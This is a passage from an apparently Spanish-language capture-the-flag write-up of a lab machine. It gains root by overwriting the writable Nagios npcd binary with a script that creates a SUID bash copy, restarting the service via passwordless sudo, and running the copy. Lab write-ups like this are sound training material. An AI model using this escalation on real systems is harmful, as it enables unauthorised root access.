</span></span><span class=line><span class=cl><span class=nv>first</span><span class=o>=(</span><span class=s2>&#34;start&#34;</span> <span class=s2>&#34;stop&#34;</span> <span class=s2>&#34;restart&#34;</span> <span class=s2>&#34;status&#34;</span> <span class=s2>&#34;reload&#34;</span> <span class=s2>&#34;checkconfig&#34;</span> <span class=s2>&#34;enable&#34;</span> <span class=s2>&#34;disable&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>second</span><span class=o>=(</span><span class=s2>&#34;postgresql&#34;</span> <span class=s2>&#34;httpd&#34;</span> <span class=s2>&#34;mysqld&#34;</span> <span class=s2>&#34;nagios&#34;</span> <span class=s2>&#34;ndo2db&#34;</span> <span class=s2>&#34;npcd&#34;</span> <span class=s2>&#34;snmptt&#34;</span> <span class=s2>&#34;ntpd&#34;</span> <span class=s2>&#34;crond&#34;</span> <span class=s2>&#34;shellinaboxd&#34;</span> <span class=s2>&#34;snmptrapd&#34;</span> <span class=s2>&#34;php-fpm&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Helper functions</span>
</span></span><span class=line><span class=cl><span class=c1># -----------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>contains <span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>local</span> <span class=nv>array</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>[@]&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>local</span> <span class=nv>seeking</span><span class=o>=</span><span class=nv>$2</span>
</span></span><span class=line><span class=cl>    <span class=nb>local</span> <span class=nv>in</span><span class=o>=</span><span class=m>1</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> element in <span class=s2>&#34;</span><span class=si>${</span><span class=p>!array</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sb>`</span> <span class=s2>&#34;</span><span class=nv>$element</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;</span><span class=nv>$seeking</span><span class=s2>&#34;</span> <span class=sb>`</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>            <span class=nv>in</span><span class=o>=</span><span class=m>0</span>
</span></span><span class=line><span class=cl>            <span class=nb>break</span>
</span></span><span class=line><span class=cl>        <span class=k>fi</span>
</span></span><span class=line><span class=cl>    <span class=k>done</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$in</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Verify to avoid abuse</span>
</span></span><span class=line><span class=cl><span class=c1># -----------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Check to verify the proper usage format</span>
</span></span><span class=line><span class=cl><span class=c1># ($1 = action, $2 = service name)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> ! contains first <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;First parameter must be one of: </span><span class=si>${</span><span class=nv>first</span><span class=p>[*]</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> ! contains second <span class=s2>&#34;</span><span class=nv>$2</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Second parameter must be one of: </span><span class=si>${</span><span class=nv>second</span><span class=p>[*]</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>action</span><span class=o>=</span><span class=nv>$1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># if service name is defined in xi-sys.cfg use that name</span>
</span></span><span class=line><span class=cl><span class=c1># else use name passed</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$2</span><span class=s2>&#34;</span> !<span class=o>=</span> <span class=s2>&#34;php-fpm&#34;</span> <span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=o>[</span> ! -z <span class=s2>&#34;</span><span class=si>${</span><span class=p>!2</span><span class=si>}</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span><span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nv>service</span><span class=o>=</span><span class=si>${</span><span class=p>!2</span><span class=si>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=nv>service</span><span class=o>=</span><span class=nv>$2</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># if the action is status, add -n 0 to args to stop journal output</span>
</span></span><span class=line><span class=cl><span class=c1># on CentOS/RHEL 7 systems</span>
</span></span><span class=line><span class=cl><span class=nv>args</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;status&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nv>args</span><span class=o>=</span><span class=s2>&#34;-n 0&#34;</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Special case for ndo2db since we don&#39;t use it anymore</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;ndo2db&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;OK - Nagios XI 5.7 uses NDO3 build in and no longer uses the ndo2db service&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Run the command</span>
</span></span><span class=line><span class=cl><span class=c1># -----------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># CentOS / Red Hat</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;CentOS&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;RedHatEnterpriseServer&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;EnterpriseEnterpriseServer&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;OracleServer&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=c1># Check for enable/disable verb</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;enable&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;disable&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>[</span> <span class=sb>`</span><span class=nb>command</span> -v systemctl<span class=sb>`</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>            <span class=sb>`</span>which systemctl<span class=sb>`</span> --no-pager <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=o>[</span> <span class=sb>`</span><span class=nb>command</span> -v chkconfig<span class=sb>`</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>            <span class=nv>chkconfig_path</span><span class=o>=</span><span class=sb>`</span>which chkconfig<span class=sb>`</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;enable&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;</span><span class=nv>$chkconfig_path</span><span class=s2>&#34;</span> --add <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;disable&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;</span><span class=nv>$chkconfig_path</span><span class=s2>&#34;</span> --del <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>            <span class=k>fi</span>
</span></span><span class=line><span class=cl>        <span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>exit</span> <span class=nv>$return_code</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=sb>`</span><span class=nb>command</span> -v systemctl<span class=sb>`</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=sb>`</span>which systemctl<span class=sb>`</span> --no-pager <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=nv>$args</span>
</span></span><span class=line><span class=cl>        <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;mysqld&#34;</span> <span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=o>[</span> <span class=nv>$return_code</span> -ne <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>            <span class=nv>service</span><span class=o>=</span><span class=s2>&#34;mariadb&#34;</span>
</span></span><span class=line><span class=cl>            <span class=sb>`</span>which systemctl<span class=sb>`</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=nv>$args</span>
</span></span><span class=line><span class=cl>            <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>        <span class=k>fi</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=o>[</span> ! <span class=sb>`</span><span class=nb>command</span> -v service<span class=sb>`</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;/etc/init.d/</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=sb>`</span>which service<span class=sb>`</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># OpenSUSE / SUSE Enterprise</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;SUSE LINUX&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$dist</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;suse11&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=sb>`</span>which service<span class=sb>`</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Ubuntu / Debian</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;Debian&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;Ubuntu&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=c1># Adjust the shellinabox service, no trailing &#39;d&#39; in Debian/Ubuntu</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;shellinaboxd&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=nv>service</span><span class=o>=</span><span class=s2>&#34;shellinabox&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=sb>`</span><span class=nb>command</span> -v systemctl<span class=sb>`</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=sb>`</span>which systemctl<span class=sb>`</span> --no-pager <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=nv>$args</span>
</span></span><span class=line><span class=cl>        <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=sb>`</span>which service<span class=sb>`</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Others?</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>exit</span> <span class=nv>$return_code</span>
</span></span></code></pre></div><p>Basados en los comentarios de uso del script, adem√°s del c√≥digo en s√≠, este script parece parar, borrar, reiniciar e iniciar servicios dentro de la m√°quina.</p><p>Del output de <code>LinPEAS</code> noto que hay algunos archivos de <code>services</code> (servicios) que puedo <em>modificar</em>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Analyzing .service files
</span></span></span><span class=line><span class=cl><span class=go>‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
</span></span></span><span class=line><span class=cl><span class=go>/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path
</span></span></span><span class=line><span class=cl><span class=go>/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
</span></span></span><span class=line><span class=cl><span class=go>/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
</span></span></span><span class=line><span class=cl><span class=go>/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
</span></span></span><span class=line><span class=cl><span class=go>/etc/systemd/system/multi-user.target.wants/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
</span></span></span><span class=line><span class=cl><span class=go>/etc/systemd/system/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
</span></span></span><span class=line><span class=cl><span class=go>You can&#39;t write on systemd PATH
</span></span></span></code></pre></div><p>Dado que podemos &ldquo;escribir&rdquo; en estos archivos, simplemente crear√© un script de <code>Bash</code> para sobreescribir <code>/usr/local/nagios/bin/npcd</code> dado que esta es una de las opciones que el script <code>manage_services.sh</code> ofrece y, adem√°s, este es uno de los servicios los cuales podemos &ldquo;sobreescribir&rdquo; (el otro es <code>nagios</code>, el cual tambi√©n puede ser explotado de manera similar). El archivo malicioso que crear√© ser√°:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>cp <span class=k>$(</span>which bash<span class=k>)</span> /tmp/gunzf0x <span class=p>;</span> chmod <span class=m>4755</span> /tmp/gunzf0x
</span></span></code></pre></div><p>El cual es un simple script que copia el binario de <code>bash</code> y le asigna permisos <code>SUID</code> a la copia.</p><p>Le asignamos permisos de ejecuci√≥n al script malicioso y modificamos el archivo del servicio <code>npcd</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nagios@monitored:~$ cp /usr/local/nagios/bin/npcd /tmp/npcd_copy # Creamos una copia de respaldo del archivo original
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nagios@monitored:~$ nano /tmp/npcd # Creamos un archivo malicioso con el script descrito arriba
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nagios@monitored:~$ chmod +x /tmp/npcd # Asignamos permisos de ejecucion para evitar problemas
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nagios@monitored:~$ mv /tmp/npcd /usr/local/nagios/bin/npcd # Reemplazamos el archivo de servicio original por nuestro script malicioso
</span></span></span></code></pre></div><p>Luego, y ya que no requerimos proveer contrase√±a, corremos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
</span></span></span></code></pre></div><p>Y chequeo si el archivo fue creado:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nagios@monitored:~$ ls -la /tmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 2120
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt 11 root   root      4096 May 10 23:32 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 19 root   root      4096 Mar 27 10:46 ..
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root   root      4096 May 10 18:50 .font-unix
</span></span></span><span class=line><span class=cl><span class=go>-rwsr-xr-x  1 root   root   1234376 May 10 23:32 gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>¬°Nuestro archivo est√° creado! Es Game Over. Corremos este archivo junto con la flag <code>-p</code> para hacerlo con permisos de ejecuci√≥n del propietario y nos convertirnos en <code>root</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nagios@monitored:~$ /tmp/gunzf0x -p
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>gunzf0x-5.1# whoami
</span></span></span><span class=line><span class=cl><span class=go>root
</span></span></span></code></pre></div><p>donde podemos, finalmente, obtener la flag del usuario <code>root</code> en el directorio <code>/root</code>.</p><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>